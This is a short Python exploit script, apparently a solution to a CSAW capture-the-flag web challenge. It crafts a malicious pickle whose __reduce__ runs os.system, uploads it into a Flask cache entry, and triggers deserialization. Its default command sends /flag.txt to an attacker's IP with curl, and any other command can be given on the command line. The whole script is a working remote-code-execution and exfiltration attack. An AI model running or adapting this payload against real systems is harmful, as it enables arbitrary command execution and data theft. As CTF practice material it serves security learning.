import pickle
import sys
import base64
import requests
import time

IP = '0.0.0.0' # Your IP here
PORT = 8000
DEFAULT_COMMAND=f'curl -d "$(cat /flag.txt)" {IP}:{PORT}'
COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND

class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system,(COMMAND,))

f = open('payload', 'wb')
f.write(b'!'+pickle.dumps(PickleRce()))
f.close()

time.sleep(0.5)

data = open('payload', 'rb').read()
print(data)
url = 'http://web.chal.csaw.io:5000/'

test = 'test23'

requests.post(url, files={ 'content': ('content', open('payload', 'rb').read()) }, data={ 'title': f'flask_cache_view//{test}' })

r = requests.get(url + test)
print(r.text)